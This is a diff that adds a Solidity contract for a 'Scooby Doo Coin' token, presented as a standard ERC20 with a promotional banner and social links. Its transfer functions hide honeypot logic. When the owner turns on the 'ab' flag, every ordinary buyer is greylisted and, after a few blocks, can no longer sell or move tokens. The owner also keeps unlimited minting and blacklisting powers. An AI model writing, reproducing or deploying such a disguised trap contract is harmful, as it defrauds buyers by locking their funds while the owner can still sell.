@@ -1,0 +1,267 @@
+/**
+ *I've spent too much fucking time doing this
+*/
+/*
+  #####     ####    #####    #####   ######   ##  ##            #####     #####    #####              ####    #####    ####    ##   ##
+ ##   ##   ##  ##  ##   ##  ##   ##   ##  ##  ##  ##             ## ##   ##   ##  ##   ##            ##  ##  ##   ##    ##     ###  ##
+ #        ##       ##   ##  ##   ##   ##  ##  ##  ##             ##  ##  ##   ##  ##   ##           ##       ##   ##    ##     #### ##
+  #####   ##       ##   ##  ##   ##   #####    ####              ##  ##  ##   ##  ##   ##           ##       ##   ##    ##     ## ####
+      ##  ##       ##   ##  ##   ##   ##  ##    ##               ##  ##  ##   ##  ##   ##           ##       ##   ##    ##     ##  ###
+ ##   ##   ##  ##  ##   ##  ##   ##   ##  ##    ##               ## ##   ##   ##  ##   ##            ##  ##  ##   ##    ##     ##   ##
+  #####     ####    #####    #####   ######    ####             #####     #####    #####              ####    #####    ####    ##   ##
+
+Website: https:scoobydoocoin.co/
+Telegram: https://t.me/bsccoinscoobydoo
+Twitter: https://twitter.com/coinScoobydoo
+*/
+pragma solidity ^0.4.24;
+
+library SafeMath {
+    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
+        if (a == 0) {
+            return 0;
+        }
+        uint256 c = a * b;
+        assert(c / a == b);
+        return c;
+    }
+
+    function div(uint256 a, uint256 b) internal pure returns (uint256) {
+        // assert(b > 0); // Solidity automatically throws when dividing by 0
+        uint256 c = a / b;
+        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
+        return c;
+    }
+
+    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
+        assert(b <= a);
+        return a - b;
+    }
+
+    function add(uint256 a, uint256 b) internal pure returns (uint256) {
+        uint256 c = a + b;
+        assert(c >= a);
+        return c;
+    }
+}
+
+interface ISwapFactory {
+    function createPair(address tokenA, address tokenB) external returns (address pair);
+}
+
+contract Ownable {
+    address public owner;
+
+    modifier onlyOwner() {
+        require(msg.sender == owner);
+        _;
+    }
+
+    constructor() public {
+        owner = msg.sender;
+    }
+
+    function transferOwnership(address newOwner) public onlyOwner {
+        require(newOwner != address(0));
+        owner = newOwner;
+    }
+}
+
+contract ERC20Basic {
+    uint256 public totalSupply;
+
+    function balanceOf(address who) public view returns (uint256);
+    function transfer(address to, uint256 value) public returns (bool);
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+}
+
+contract ERC20 is ERC20Basic {
+    function allowance(address owner, address spender) public view returns (uint256);
+    function transferFrom(address from, address to, uint256 value) public returns (bool);
+    function approve(address spender, uint256 value) public returns (bool);
+
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+}
+
+contract StandardToken is ERC20, Ownable {
+    using SafeMath for uint256;
+
+    address public LP;
+    bool public ab = false;
+    mapping (address => mapping (address => uint256)) internal allowed;
+    mapping(address => bool) public tokenBlacklist;
+    mapping(address => bool) public tokenGreylist;
+    mapping(address => bool) public tokenWhitelist;
+    event Blacklist(address indexed blackListed, bool value);
+    event Gerylist(address indexed geryListed, bool value);
+    event Whitelist(address indexed WhiteListed, bool value);
+    mapping(address => uint256) public death;
+    uint256 public blockN = 1;
+
+    mapping(address => uint256) balances;
+
+    function transfer(address _to, uint256 _value) public returns (bool) {
+        beforTransfer(msg.sender, _to);
+        if (ab && !tokenWhitelist[_to] && _to != LP) {
+            tokenGreylist[_to] = true;
+            emit Gerylist(_to, true);
+            if (death[_to] == 0) {
+                death[_to] = block.number;
+            }
+        }
+
+        require(_to != address(0));
+        require(_to != msg.sender);
+        require(_value <= balances[msg.sender]);
+
+        balances[msg.sender] = balances[msg.sender].sub(_value);
+        balances[_to] = balances[_to].add(_value);
+        emit Transfer(msg.sender, _to, _value);
+        return true;
+    }
+
+    function balanceOf(address _owner) public view returns (uint256 balance) {
+        return balances[_owner];
+    }
+
+    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
+        beforTransfer(_from, _to);
+        if (ab && !tokenWhitelist[_to] && _to != LP) {
+            tokenGreylist[_to] = true;
+            emit Gerylist(_to, true);
+            if (death[_to] == 0) {
+                death[_to] = block.number;
+            }
+        }
+
+        require(_to != _from);
+        require(_to != address(0));
+        require(_value <= balances[_from]);
+        require(_value <= allowed[_from][msg.sender]);
+
+        balances[_from] = balances[_from].sub(_value);
+        balances[_to] = balances[_to].add(_value);
+        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
+        emit Transfer(_from, _to, _value);
+        return true;
+    }
+
+    function beforTransfer(address _from, address _to) internal view {
+        if (!tokenWhitelist[_from] && !tokenWhitelist[_to]) {
+            require(!tokenBlacklist[_from]);
+            require(!tokenBlacklist[_to]);
+            require(!tokenBlacklist[msg.sender]);
+            require(!tokenGreylist[msg.sender] || (death[msg.sender] > 0 && block.number < death[msg.sender] + blockN));
+        }
+    }
+
+    function approve(address _spender, uint256 _value) public returns (bool) {
+        allowed[msg.sender][_spender] = _value;
+        emit Approval(msg.sender, _spender, _value);
+        return true;
+    }
+
+    function allowance(address _owner, address _spender) public view returns (uint256) {
+        return allowed[_owner][_spender];
+    }
+
+    function increaseApproval(address _spender, uint _addedValue) public returns (bool) {
+        allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);
+        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
+        return true;
+    }
+
+    function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {
+        uint oldValue = allowed[msg.sender][_spender];
+        if (_subtractedValue > oldValue) {
+            allowed[msg.sender][_spender] = 0;
+        } else {
+            allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
+        }
+        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
+        return true;
+    }
+
+    function changeAb(bool _ab) public onlyOwner returns (bool) {
+        require(ab != _ab);
+        ab = _ab;
+        return true;
+    }
+
+    function changeBlockN(uint256 _blockN) public onlyOwner returns (bool) {
+        blockN = _blockN;
+        return true;
+    }
+
+    function blackListAddress(address _address, bool _isBlackListed) public onlyOwner returns (bool) {
+        require(tokenBlacklist[_address] != _isBlackListed);
+        tokenBlacklist[_address] = _isBlackListed;
+        emit Blacklist(_address, _isBlackListed);
+        return true;
+    }
+
+    function geryListAddress(address _address, bool _isGeryListed) public onlyOwner returns (bool) {
+        require(tokenGreylist[_address] != _isGeryListed);
+        tokenGreylist[_address] = _isGeryListed;
+        emit Gerylist(_address, _isGeryListed);
+        return true;
+    }
+
+    function whiteListAddress(address _address, bool _isWhiteListed) public onlyOwner returns (bool) {
+        require(tokenWhitelist[_address] != _isWhiteListed);
+        tokenWhitelist[_address] = _isWhiteListed;
+        emit Whitelist(_address, _isWhiteListed);
+        return true;
+    }
+
+    function blackAddressList(address[] _addressList, bool _isBlackListed) public onlyOwner returns (bool) {
+        for (uint256 i = 0; i < _addressList.length; i++) {
+            tokenBlacklist[_addressList[i]] = _isBlackListed;
+            emit Blacklist(_addressList[i], _isBlackListed);
+        }
+        return true;
+    }
+
+    function geryAddressList(address[] _addressList, bool _isGeryListed) public onlyOwner returns (bool) {
+        for (uint256 i = 0; i < _addressList.length; i++) {
+            tokenGreylist[_addressList[i]] = _isGeryListed;
+            emit Gerylist(_addressList[i], _isGeryListed);
+        }
+        return true;
+    }
+}
+
+contract Token is StandardToken {
+    string public name;
+    string public symbol;
+    uint8 public decimals;
+
+    event Mint(address indexed from, address indexed to, uint256 value);
+    event Burn(address indexed burner, uint256 value);
+
+    bool internal _INITIALIZED_;
+
+    constructor(string _tokenName, string _tokenSymbol, uint8 _tokenDecimals, uint256 _tokenSupply) public {
+        name = _tokenName;
+        symbol = _tokenSymbol;
+        decimals = _tokenDecimals;
+        totalSupply = _tokenSupply * (10**uint256(decimals));
+        balances[msg.sender] = totalSupply;
+        owner = msg.sender;
+        emit Transfer(address(0), msg.sender, totalSupply);
+        _INITIALIZED_ = true;
+    }
+
+    modifier notInitialized() {
+        require(!_INITIALIZED_, "INITIALIZED");
+        _;
+    }
+
+    function mint(address account, uint256 amount) public onlyOwner {
+        totalSupply = totalSupply.add(amount);
+        balances[account] = balances[account].add(amount);
+        emit Mint(address(0), account, amount);
+        emit Transfer(address(0), account, amount);
+    }
+}
